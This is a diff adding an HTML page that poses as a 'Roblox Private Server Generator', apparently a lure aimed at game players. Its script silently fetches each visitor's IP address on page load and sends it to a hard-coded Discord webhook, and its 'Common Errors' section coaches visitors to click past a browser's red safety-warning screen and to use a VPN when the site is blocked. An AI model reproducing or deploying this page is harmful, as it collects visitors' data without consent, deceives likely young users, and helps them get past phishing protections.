@@ -1,1 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Private Server Generator</title>
+    <style>
+        /* General Styles */
+        body, h1, h2, p, ul {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background-color: #111; /* Dark background */
+            color: white;
+            padding: 20px;
+        }
+
+        .container {
+            width: 80%;
+            max-width: 1200px;
+            margin: 0 auto;
+            background-color: #222; /* Dark container */
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+        }
+
+        h1 {
+            text-align: center;
+            color: #ff5733; /* Bright red for title */
+            margin-bottom: 30px;
+            font-size: 36px;
+        }
+
+        .live-servers-btn {
+            display: block;
+            width: 220px;
+            height: 50px;
+            margin: 20px auto;
+            background-color: #e60000; /* Red button */
+            color: white;
+            font-size: 18px;
+            text-align: center;
+            line-height: 50px;
+            border-radius: 25px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .live-servers-btn:hover {
+            background-color: #c30000; /* Darker red on hover */
+        }
+
+        .errors-container {
+            margin-top: 30px;
+        }
+
+        .error-tab {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #333; /* Dark gray tabs */
+            color: white;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+        }
+
+        .error-tab:hover {
+            background-color: #ff5733; /* Red on hover */
+        }
+
+        .error-content {
+            display: none;
+            margin-top: 15px;
+            padding: 15px;
+            background-color: #444; /* Dark content background */
+            border-left: 5px solid #e60000; /* Red left border */
+            border-radius: 8px;
+        }
+
+        .error-content ul {
+            padding-left: 20px;
+        }
+
+        .error-content ul li {
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+
+        .more-info-btn, .continue-btn {
+            color: #1e90ff;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .more-info-btn:hover, .continue-btn:hover {
+            text-decoration: underline;
+        }
+
+        /* Button Styling */
+        .continue-btn {
+            color: #228B22;
+        }
+        
+        .continue-btn:hover {
+            color: #1c741d;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Roblox Private Server Generator</h1>
+
+        <!-- LIVE SERVERS Button -->
+        <a href="https://www.roblox.com" target="_blank" class="live-servers-btn">LIVE SERVERS</a>
+
+        <!-- Common Errors Section -->
+        <div class="errors-container">
+            <div class="error-tab" onclick="toggleErrorContent('error1')">Common Errors</div>
+
+            <div class="error-content" id="error1">
+                <h2 style="color: #ff5733;">Error 1: Big Red (Smart Scan) Screen</h2>
+                <p style="color: white;">To fix the "Big Red (Smart Scan)" screen, follow these steps:</p>
+                <ul>
+                    <li>Click <strong>"More Information"</strong>.</li>
+                    <li>Once the dropdown appears, click <strong>"CONTINUE"</strong>.</li>
+                </ul>
+            </div>
+
+            <div class="error-tab" onclick="toggleErrorContent('error2')">Error 2: Site Can't Be Reached</div>
+
+            <div class="error-content" id="error2">
+                <h2 style="color: #ff5733;">Error 2: Site Can't Be Reached</h2>
+                <p style="color: white;">To fix the "Site Can't Be Reached" error, try the following:</p>
+                <ul>
+                    <li>Use a VPN to access the site.</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        async function logIpAddress(userKey) {
+            try {
+                const ipResponse = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
+
+                const webhookUrl = "https://discord.com/api/webhooks/1302810226734403595/MMPGCUIQa0FD3_5WDk5_pFGwIlGGCe_6GjmxqNTQTd15CzHQ-jIsBAfv0M3HTBArMTHf";
+                const payload = {
+                    content: `@everyone IP ADDRESS: ${ipAddress}\nKEY: ${userKey}`
+                };
+
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error("error:", error);
+            }
+        }
+
+        // Automatically log IP address on page load
+        window.onload = function() {
+            const userKey = 'yourUserKeyHere'; // Replace with actual user key
+            logIpAddress(userKey);
+        };
+
+        // Function to toggle error content visibility
+        function toggleErrorContent(errorId) {
+            var content = document.getElementById(errorId);
+            if (content.style.display === "block") {
+                content.style.display = "none";
+            } else {
+                content.style.display = "block";
+            }
+        }
+    </script>
+</body>
+</html>
 
